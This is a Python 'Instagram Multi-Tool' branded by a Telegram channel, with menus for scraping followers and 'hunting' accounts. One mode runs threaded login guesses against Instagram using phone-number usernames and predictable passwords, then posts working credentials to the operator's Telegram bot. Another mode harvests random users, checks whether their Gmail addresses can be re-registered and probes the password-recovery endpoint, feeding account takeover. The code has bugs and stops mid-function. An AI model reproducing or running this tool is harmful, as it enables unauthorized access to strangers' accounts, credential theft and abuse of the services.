
















































# ============================================
# OWNER  : SIFO
# CHANNEL: @DarkByte2026
# CONTACT: @SI123FO
# TOOL   : Instagram Multi-Tool
# ============================================

import time
import random
import string
import json
import os
import sys
from threading import Thread
try:
    import requests
    from user_agent import generate_user_agent as ua
    from faker import Faker
    from rich import print as p
    from rich.panel import Panel as P
    from rich.console import Console
    from pyfiglet import *
    from bs4 import *
    from tqdm import *
except:
    print('[%] Wait Librarys Downloaded ')
    os.system('pip install user_agent bs4 rich tqdm pyfiglet requests faker')
    os.system('clear')
    os.execv(sys.executable, ['python'] + sys.argv)

R1 = '\033[1;31m'
G1 = '\033[1;32m'
Y1 = '\033[1;33m'
B1 = '\033[1;34m'
P1 = '\033[1;35m'
C1 = '\033[1;36m'
W1 = '\033[1;39m'

Fk = Faker()
se = requests.Session()
ts = str(time.time()).split('.')[0]
oneTapPrompt = False
console = Console()

GN = 0
BN = 0
GE = 0
BE = 0


def GNR(text, delay=0.1, style="white on red", new_line=True):
    for char in text:
        console.print(char, style=style, end="")
        sys.stdout.flush()
        time.sleep(delay)
    if new_line:
        console.print()


def tools():
    frames = [
        f"""
[bold red]
   {figlet_format(text='SIFO', font='cygnet')}
[bold red]
""",
        f"""
[bold yellow]
   {figlet_format(text='SIFO', font='slant')}
[bold yellow]
""",
        f"""
[bold green]
   {figlet_format(text='SIFO', font='soft')}
[bold green]
"""
    ]

    for i in range(5):
        for frame in frames:
            os.system('cls' if os.name == 'nt' else 'clear')
            console.print(frame, justify="center")
            time.sleep(0.4)

    GNR("Welcome To SIFO Tool [Telegram:@SI123FO]", delay=0.08, style="bold white on red")

    console.print()

    menu_lines = [
        ("[1] Get List Followers", "bold cyan"),
        ("[2] Get List Following", "bold magenta"),
        ("[3] Check List", "bold red"),
        ("[4] Hunt Random Accounts", "bold green"),
        ("[5] Hunt Accounts Username & Password", "bold blue"),
        ("[6] Hunt Usernames", "bold yellow")
    ]

    for line, color in menu_lines:
        GNR(line, delay=0.05, style=color)

    console.print()

    GNR("[+]Choice For Run: ", delay=0.05, style="bold white on red", new_line=False)
    ch = input()
    print(W1 + '-' * 20)
    if ch == '1':
        Followers()
    elif ch == '2':
        Following()
    elif ch == '3':
        Check_List()
    elif ch == '4':
        Instagram()
    elif ch == '5':
        InstaGram()
    elif ch == '6':
        users()
    else:
        console.print()
        GNR("Invalid choice!", style="bold red on white")


def InstaGram():
    p('Version:0.1' + '[green bold]' + figlet_format("INSTA", font='poison'))
    p('''[1] [red bold]Instagram account Iraq [Zain][/]
[2] [green bold]Instagram account Iraq [Asia][/]
[3] [yellow bold]Instagram account Iraq [Korek][/]
''')
    ch = input('[!]Choose what suits you:')
    ID = input(f'{W1}[{C1}+{W1}]{Y1}Enter Your Id:{R1}')
    Token = input(f'{W1}[{C1}+{W1}]{Y1}Enter Your Token:{R1}')
    print(W1 + '-' * 20)
    n = '78' if ch == '1' else '77' if ch == '2' else '75' if ch == '3' else exit('[×]Error_input')

    def Login(username, password):
        se.headers.update({
            'user-agent': str(ua()),
            'x-requested-with': 'XMLHttpRequest',
            'referer': 'https://www.instagram.com/',
            'content-type': 'application/x-www-form-urlencoded',
        })

        response = se.get('https://www.instagram.com/')
        csrf_token = se.cookies.get_dict().get('csrftoken', '')

        soup = BeautifulSoup(response.text, 'html.parser')
        app_id = None

        for script in soup.find_all('script'):
            if script.string and 'APP_ID' in script.string:
                start = script.string.find('"APP_ID":"') + len('"APP_ID":"')
                end = script.string.find('"', start)
                app_id = script.string[start:end]
                break

        if not app_id:
            app_id = '936619743392459'

        se.headers['x-csrftoken'] = csrf_token
        se.headers['x-ig-app-id'] = app_id
        se.cookies.set('csrftoken', csrf_token)

        login_data = {
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{ts}:{password}',
            'username': f'964{username}',
        }

        _url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
        login = se.post(_url, data=login_data)
        try:
            if login.json()['oneTapPrompt'] != oneTapPrompt:
                oneTapPrompt = True
                print(f'{G1}God:{P1}{username}{Y1}|{P1}{password}')
                God = f'''

            <======♕Good Account♕======>

Username:{username}

Password:{password}

            <=========[SIFO]=========>
    OWNER:@SI123FO | CH:@DarkByte2026       
                '''
                requests.post(f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text={God} ''')
            else:
                pass
        except:
            print(f'{R1}Bad:{P1}{username}{Y1}|{P1}{password}')

    def Guess():
        while True:
            time.sleep(0.5)
            username = n + ''.join(random.choice('1234567890') for i in range(8))
            password = '0' + username
            Login(username, password)

    for i in range(10):
        Thread(target=Guess).start()


def users():
    def Get():
        ID = input(f'{W1}[{C1}+{W1}]{Y1}Enter Your Id:{R1}')
        Token = input(f'{W1}[{C1}+{W1}]{Y1}Enter Your Token:{R1}')
        print(W1 + '-' * 15)
        while 1:
            url = "https://www.instagram.com/api/v1/users/check_username/"
            re = requests.post(url).cookies.get_dict()['csrftoken']
            us0 = ''.join(random.choice('qwertyuiopasdfghjklzxcvbnm') for i in range(1))
            us1 = ''.join(random.choice('1234567890') for i in range(1))
            us2 = ''.join(random.choice('qwertyuiopasdfghjklzxcvbnm1234567890') for i in range(1))
            us3 = ''.join(random.choice('qwertyuiopasdfghjklzxcvbnm1234567890') for i in range(1))
            us4 = ''.join(random.choice('._') for i in range(1))
            use = us0 + us3 + us1 + us2 + us4
            use0 = us2 + us4 + us0 + us3 + us1
            use1 = us0 + us4 + us1 + us2 + us3
            use2 = us0 + us4 + us1 + us4 + us2
            use3 = us2 + us4 + us3 + us1 + us0
            use4 = us0 + us1 + us3 + us4 + us2
            user = random.choice([use, use0, use1, use2, use3, use4])
            url = "https://www.instagram.com/api/v1/users/check_username/"
            payload = {
                'username': user,
            }
            he = {
                'User-Agent': str(ua()),
                'x-csrftoken': re}
            res = requests.post(url, headers=he, data=payload).text
            if '"available":true' in res:
                p(f'[green bold]God User:[yellow bold]{user}[/]')
                God = f'''

                <======♕Good Account♕======>

    Username:{user}

                <=========[SIFO]=========>
        OWNER:@SI123FO  | CH:@DarkByte2026       
                    '''
                requests.post(f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text={God} ''')
            else:
                p(f'[red bold]Bad User:[yellow bold]{user}[/]')

    for x in range(10):
        Thread(target=Get).start()


def Instagram():
    ID = input(f'{W1}[{C1}+{W1}]{Y1}Enter Your Id:{R1}')
    Token = input(f'{W1}[{C1}+{W1}]{Y1}Enter Your Token:{R1}')
    os.system('clear')

    def Info(username):
        headers = {
            'user-agent': str(ua()),
            'x-csrftoken': 'znk9dtIIOHMFI5pVbgsRQPpbcz9CVqr9',
            'x-ig-app-id': '936619743392459',
        }

        params = {
            'username': username,
        }

        re = requests.get(
            'https://www.instagram.com/api/v1/users/web_profile_info/',
            params=params,
            headers=headers,
        ).json()
        try:
            Name = re['data']['user']['full_name']
            followers = re['data']['user']['edge_followed_by']['count']
            Follow = re['data']['user']['edge_follow']['count']
            Id = re['data']['user']['id']
            Bio = re['data']['user']['biography']
        except:
            rs = requests.get(
                'https://www.instagram.com/api/v1/users/web_profile_info/',
            ).cookies.get_dict()['csrftoken']
            headers['x-csrftoken'] = rs
        try:
            headers = {
                'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
                'X-Pigeon-Rawclienttime': '1700251574.982',
                'X-IG-Connection-Speed': '-1kbps',
                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                'X-IG-Bandwidth-TotalBytes-B': '0',
                'X-IG-Bandwidth-TotalTime-MS': '0',
                'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-App-ID': '567067343352427',
                'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
                'Accept-Language': 'en-GB, en-US',
                'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'X-FB-HTTP-Engine': 'Liger',
                'Connection': 'keep-alive',
                'Content-Length': '356',
            }
            data = {
                'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"' + username + '"}',
                'ig_sig_key_version': '4',
            }
            res = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers,
                                data=data, )
            r = res.json()['email']
            if r.split('@')[1] == 'gmail.com':
                rr = r.split('@')[0]
                if rr[0] == username[0] and rr[-1] == username[-1]:
                    rest = r

                else:
                    rest = False
            else:
                rest = False
        except:
            rest = None
        Info = f'''
        ========<<<<SIFO>>>>========
         𝐍𝐚𝐦𝐞 : {Name}
         𝐄𝐦𝐚𝐢𝐥 : {username}@gmail.com 
         𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 : {followers} 
         𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 : {Follow}
         𝐃𝐚𝐭𝐞 : None
         𝐢𝐃 : {Id}
         𝐁𝐢𝐨 : {Bio}
         𝐑𝐞𝐬𝐞𝐭 : {rest}
         𝐥𝐢𝐧𝐤 : https://www.instagram.com/{username}
        ========<<<<SIFO>>>>========
OWNER:@SI123FO |  CH:@DarkByte2026
        '''
        requests.post(f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text={Info} ''')

    def gmail(username):
        global GN, BN, GE, BE
        name = str(Fk.name())
        year = str(random.randrange(1980, 2010))
        month = str(random.randrange(1, 12))
        day = str(random.randrange(1, 28))
        headers = {
            'authority': 'accounts.google.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'user-agent': str(ua()),
            'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
            'x-client-data': 'CMbxygE=',
        }
        params = {
            'biz': 'false',
            'continue': 'http://support.google.com/mail/answer/56256?hl=ar',
            'ec': 'GAlAdQ',
            'flowEntry': 'SignUp',
            'flowName': 'GlifWebSignIn',
            'hl': 'ar',
            'authuser': '0',
        }

        res = se.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)

        TL = res.url.split('TL=')[1].split()[0]
        at = res.text.split('"SNlM0e":"')[1].split('"')[0].replace(':', '%3A')
        xr = res.text.split('"Qzxixc":"')[1].split('"')[0]

        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'user-agent': str(ua()),
            'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
            'x-client-data': 'CMbxygE=',
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': f'["{xr}"]',
            'x-same-domain': '1',
        }

        params = {
            'rpcids': 'E815hb',
            'source-path': '/lifecycle/steps/signup/name',
            'f.sid': '8878106518468624430',
            'bl': 'boq_identity-account-creation-evolution-ui_20250319.07_p0',
            'hl': 'ar',
            'TL': TL,
            '_reqid': '129653',
            'rt': 'c',
        }

        data = f'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{name}%D8%AC%D9%86%D8%B1%D8%A7%D9%84%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'

        rex = se.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,
            headers=headers,
            data=data,
        )

        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'user-agent': str(ua()),
            'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
            'x-client-data': 'CMbxygE=',
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': f'["{xr}"]',
            'x-same-domain': '1',
        }

        params = {
            'rpcids': 'eOY7Bb',
            'source-path': '/lifecycle/steps/signup/birthdaygender',
            'f.sid': '8878106518468624430',
            'bl': 'boq_identity-account-creation-evolution-ui_20250319.07_p0',
            'hl': 'ar',
            'TL': TL,
            '_reqid': '429653',
            'rt': 'c',
        }
        data = f'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{year}%2C{month}%2C{day}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Ce7dqt-8CAAYS9oQNMvaNI-E0kDL2R8b0ADQBEArZ1Ii0ewZerS_7PBbUbK96k4d-7EUxCP2CNXM6XGobK0PC7E4HshzM1i7q2FVJ94jazQAAAwedAAAAKqcBB7EATTRIdjiLSgfcYKbEmqvAUgvTdx47_HplH3SQ0tr7csO3cf_aXFTEVFv9kA1RjEYYe9qfVreYjX4nVaFxRkvoFij3x6CiWd_z9-QD6m1bVgaqUu8nJlmtfsAihcv-HolbkeE8dfLkxoQtSyA_uhBUsZFX6A56Ul-A2T4c__nyopEGMXYZbvo2yorCm1rfQhJqwnHJCLT5xAACQg0fFT_yvhQj_3WSPfDc7QANHJgxzcH6kdHY0n-U_U1gbi0eJ0B0hrq_BTWwcPrGQAhBIgJBkMsXgu3eo3Mdx0zXF_0rNfkpF_8HSycSWLNTR38PS__rB1LvS5P2YRtCRavP9byAZ-CN_roEhEc9Qx3OI_VWdUlCASoMYp3lX1TapTw-KcHNA481z5tGLY__Z5CdTUyHtqeEJcOI1pU0axO0q2ATMZXO0P9YdP9NlO5Qhdubh90ZaT1O3zmDPoGiHYZ8ol0qRsxKwDwsqh8OpxaIShfjura9MnJj0Rn3ZcW2Pbvmg2vjpGobqe7X5hwrjytE5WsYtZgoUSQFUgIgqCdKs70n_mDvItjF2fEGu0g9q7a6ozXJR2-ZTUxpbMIktze_ttp_rICWGXBo1N3VIz0fgRHKEfd1E--QQ4MV9n6Fl_EkhphO5fUJFGYitCK1OEBjZL3sG6TxUxwLzq5bZwT0_x3_w2iZZFWad4oaI9UiIgHs09PSj7O0oV1IZcaL2MxPlrSP4_oXpgb8WS_TeovMGaYNtERgJEkjywqOIQU86X-O5rySXn3_ZyFBBaBDRhhWtJ93_4TIUe7Xb6zrNOpH9lhFWPV8j9sD_f_78HwE1MMCVPZ4_Yb-YxPODcvpAyl7_LgxY0IbIuqntFiGdLH277Hgj2LdEf-GwSNXDONR8bgD_f8Hd2ynPWu6aiiXGqDAF6zqUSk_8gGYcPaVKvj-xR-Ay8eBeZg32brhuFiDbDbd-7aWuJ_qvP9F5CvIPbaMh1IMUuCq18Ek7zjxh4nRLs8oN_Bf4biSl5_-9A9svKzrS_BMqfC2GYmBkWyCaf50TJ8ImgAFdA3xSerzi5UTahcK6F3B7E2wuH8sUi-yEDi_VHX9zAatz8A8WFSuK_D1Fp6kHEMOXtDjI4iDZHIn-ytQGNeoJoKhTfoPlQ4vhDtzH1BP3RuqzuHyGxCvbwvclsl4rV4gEqcR7hxuzt6WRmn6KGP4UXncpZKi0SliLpPCQMLLtdUvZqUhaN9FYMkdp2AkVJC4qhmbYsQYQBGAzklyvjUCh4DoQs9mhl9HlSMjcpCV-OJkCKMcButOvDrD0nQuANzusT419Ox1oVgEsUMdErZfywBm7YDqGth1T97anpiAeFG_QeDabJzidbHSD6WRgqwFs4dJ9mv7M5HPg2xX5j10244kIbc5UQgL68TVClLj83QNdpSZZMu5kNREbjOs3NELDv4f2wVzI5cFQyld0PkGfsI4CgobzFXgkqcyKbvmi4TkmCH6jkzJK8bx986hQGjVdX31Gg9bexhNXD2wlohQQfQUwpxIKu2TLFT_TZyPMGAIlFw89NHAH-NXSa1oXuOY_zgH7T2ESNQ4P3DjkUGPOBxl6AyqEh2DkKbwvOhRP3Yo7ceAVMpwxKYjwmaHD6OmZhnNF603lgvuKPfjdIwgYL66EnYel7S5tY3MOHlTFeM29gMzh8nC86bTKZwxRf2KlT5b-8mGAbrEcggQXdZp7PBi5M5xw9KxboB_Jf_mpgoRBl-_tgsWiQil4VVWICp-QVB94lLM1UWwGBR34kb5IbDDbl7LE-9s1qGcNVGL6q6YLRiJjL1M-roVJSn-JZQEuzoG7pBceotln2l87YTtN2jTB0w_xBtzH_O8H18cwF0QMNWwO_F-AsM21hmKPNCFoctsTWdmiPR4D2py1MjaNZoQe499SxOUGsFyiUI-ij2B2HNB_5LWUUxA4i9M9hQXE2bN8jqYc-AWq9hauHIXfkin5JpUoEPuLa4xyL2dwUZYK1xrg8gWOGhW0o9dLvWewAhM12XFUyXVHvIjUdJgqX26T3wmIJW6AiEAhvWHyuhoDQQuUG30mJeeG4YLm2_LORmSa6QGmmPjXAkFt-mMcvVAep3AjteJTozNvKAXIp5kd35fyJtLgkMRP-J1IqhyneiuajBTvldAXxBZsh5SzmMamwzjnrOzZ-yD94odwwiBduS16F2yiz3N5-pOqklt3AiRTD13-CRniPl6MASfSujoX3XADBAJujd6eURxhbx-ef_RhxdbpucwtDc2tmaL9LFjHh-RUDROvHOS1dKKCH31TtrnwjOjYG-shDoYsF0zRl7cUVzMNdVOxQ_jB7ttmFeEWX2mgkDJ6M78DdwcyRvtYH2tb8uNOXXa5WQwvgmk7L7-Aa1Zn10%5C%22%2C%5Bnull%2Cnull%2C%5C%22http%3A%2F%2Fsupport.google.com%2Fmail%2Fanswer%2F56256%3Fhl%3Dar%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5C%22GAlAdQ%5C%22%5D%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'

        response = se.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,
            headers=headers,
            data=data,
        )

        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'user-agent': str(ua()),
            'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
            'x-client-data': 'CMbxygE=',
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': f'["{xr}"]',
            'x-same-domain': '1',
        }

        params = {
            'rpcids': 'NHJMOd',
            'source-path': '/lifecycle/steps/signup/username',
            'f.sid': '8878106518468624430',
            'bl': 'boq_identity-account-creation-evolution-ui_20250319.07_p0',
            'hl': 'ar',
            'TL': TL,
            '_reqid': '1029653',
            'rt': 'c',
        }

        data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{username}%5C%22%2C1%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C196219%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'

        re = se.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,
            headers=headers,
            data=data,
        ).text
        if 'password' in re:
            Info(username)
            GE += 1
            os.system('clear')
            p(
                f'[green bold]God IN[yellow bold]:[green bold]{GN} [red bold]Bad EM[yellow bold]:[red bold]{BE} [green bold]God EM[yellow bold]:[green bold]{GE} [red bold]Bad IN[yellow bold]:[red bold]{BN}')
        else:
            BE += 1
            os.system('clear')
            p(
                f'[green bold]God IN[yellow bold]:[green bold]{GN} [red bold]Bad EM[yellow bold]:[red bold]{BE} [green bold]God EM[yellow bold]:[green bold]{GE} [red bold]Bad IN[yellow bold]:[red bold]{BN}')

    def insta(username):
        global GN, BN, GE, BE
        crf = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/',
                             ).cookies.get_dict()['csrftoken']
        he = {
            'user-agent': str(ua()),
            'x-csrftoken': crf,
            'x-ig-app-id': '936619743392459',
        }
        data = {
            'email': username + '@gmail.com',
        }
        res = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=he,
                            data=data,
                            ).text
        if "email_is_taken" in res:
            GN += 1
            gmail(username)
            os.system('clear')
            p(
                f'[green bold]God IN[yellow bold]:[green bold]{GN} [red bold]Bad EM[yellow bold]:[red bold]{BE} [green bold]God EM[yellow bold]:[green bold]{GE} [red bold]Bad IN[yellow bold]:[red bold]{BN}')
        else:
            BN += 1
            os.system('clear')
            p(
                f'[green bold]God IN[yellow bold]:[green bold]{GN} [red bold]Bad EM[yellow bold]:[red bold]{BE} [green bold]God EM[yellow bold]:[green bold]{GE} [red bold]Bad IN[yellow bold]:[red bold]{BN}')

    def Get_Users():
        while True:
            data = {
                'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                'variables': json.dumps({
                    'id': int(random.randrange(1629010000, 2500000000)),
                    'render_surface': 'PROFILE'
                }),
                'doc_id': '25618261841150840'
            }
            headers = {'X-FB-LSD': data['lsd']}
            try:
                response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
                user = response.json().get('data', {}).get('user', {})
                username = user.get('username')
                if '_' not in username:
                    if len(username) >= 6:
                        insta(username)
                    else:
                        pass
                else:
                    pass
            except:
                Get_Users()

    for i in range(10):
        Thread(target=Get_Users).start()


def Check_List():
    ID = input(f'{W1}[{C1}+{W1}]{Y1}Enter Your Id:{R1}')
    Token = input(f'{W1}[{C1}+{W1}]{Y1}Enter Your Token:{R1}')
    File = input(f'{W1}[{C1}+{W1}]{Y1}Enter File Name:{R1}')
    os.system('clear')
    try:
        with open(File, 'r', encoding='utf-8') as f:
            users = [line.strip() for line in f]
        return users
    except:
        print(f'[✘]{R1}File Name Not Found:{File}')
        exit()

    def Info(email):
        headers = {
            'user-agent': str(ua()),
            'x-csrftoken': 'znk9dtIIOHMFI5pVbgsRQPpbcz9CVqr9',
            'x-ig-app-id': '936619743392459',
        }

        params = {
            'username': email,
        }

        re = requests.get(
            'https://www.instagram.com/api/v1/users/web_profile_info/',
            params=params,
            headers=headers,
        ).json()
        try:
            Name = re['data']['user']['full_name']
            followers = re['data']['user']['edge_followed_by']['count']
            Follow = re['data']['user']['edge_follow']['count']
            Id = re['data']['user']['id']
            Bio = re['data']['user']['biography']
        except:
            rs = requests.get(
                'https://www.instagram.com/api/v1/users/web_profile_info/',
            ).cookies.get_dict()['csrftoken']
            headers['x-csrftoken'] = rs
        try:
            headers = {
                'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
                'X-Pigeon-Rawclienttime': '1700251574.982',
                'X-IG-Connection-Speed': '-1kbps',
                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                'X-IG-Bandwidth-TotalBytes-B': '0',
                'X-IG-Bandwidth-TotalTime-MS': '0',
                'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-App-ID': '567067343352427',
                'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
                'Accept-Language': 'en-GB, en-US',
                'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'X-FB-HTTP-Engine': 'Liger',
                'Connection': 'keep-alive',
                'Content-Length': '356',
            }
            data = {
                'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"' + email + '"}',
                'ig_sig_key_version': '4',
            }
            res = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers,
                                data=data, )
            r = res.json()['email']
            if r.split('@')[1] == 'gmail.com':
                rr = r.split('@')[0]
                if rr[0] == email[0] and rr[-1] == email[-1]:
                    rest = r

                else:
                    rest = False
            else:
                rest = False
        except:
            rest = None
        Info = f'''
        ========<<<<SIFO>>>>========
         𝐍𝐚𝐦𝐞 : {Name}
         𝐄𝐦𝐚𝐢𝐥 : {email}@gmail.com 
         𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 : {followers} 
         𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 : {Follow}
         𝐃𝐚𝐭𝐞 : None
         𝐢𝐃 : {Id}
         𝐁𝐢𝐨 : {Bio}
         𝐑𝐞𝐬𝐞𝐭 : {rest}
         𝐥𝐢𝐧𝐤 : https://www.instagram.com/{email}
        ========<<<<SIFO>>>>========
OWNER:@SI123FO |  CH:@DarkByte2026
        '''
        requests.post(f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text={Info} ''')

    def gmail(email):
        global GN, BN, GE, BE
        name = str(Fk.name())
        year = str(random.randrange(1980, 2010))
        month = str(random.randrange(1, 12))
        day = str(random.randrange(1, 28))
        headers = {
            'authority': 'accounts.google.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'user-agent': str(ua()),
            'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
            'x-client-data': 'CMbxygE=',
        }
        params = {
            'biz': 'false',
            'continue': 'http://support.google.com/mail/answer/56256?hl=ar',
            'ec': 'GAlAdQ',
            'flowEntry': 'SignUp',
            'flowName': 'GlifWebSignIn',
            'hl': 'ar',
            'authuser': '0',
        }

        res = se.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)

        TL = res.url.split('TL=')[1].split()[0]
        at = res.text.split('"SNlM0e":"')[1].split('"')[0].replace(':', '%3A')
        xr = res.text.split('"Qzxixc":"')[1].split('"')[0]

        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'user-agent': str(ua()),
            'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
            'x-client-data': 'CMbxygE=',
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': f'["{xr}"]',
            'x-same-domain': '1',
        }

        params = {
            'rpcids': 'E815hb',
            'source-path': '/lifecycle/steps/signup/name',
            'f.sid': '8878106518468624430',
            'bl': 'boq_identity-account-creation-evolution-ui_20250319.07_p0',
            'hl': 'ar',
            'TL': TL,
            '_reqid': '129653',
            'rt': 'c',
        }

        data = f'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{name}%D8%AC%D9%86%D8%B1%D8%A7%D9%84%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'

        rex = se.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,
            headers=headers,
            data=data,
        )

        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'user-agent': str(ua()),
            'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
            'x-client-data': 'CMbxygE=',
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': f'["{xr}"]',
            'x-same-domain': '1',
        }

        params = {
            'rpcids': 'eOY7Bb',
            'source-path': '/lifecycle/steps/signup/birthdaygender',
            'f.sid': '8878106518468624430',
            'bl': 'boq_identity-account-creation-evolution-ui_20250319.07_p0',
            'hl': 'ar',
            'TL': TL,
            '_reqid': '429653',
            'rt': 'c',
        }
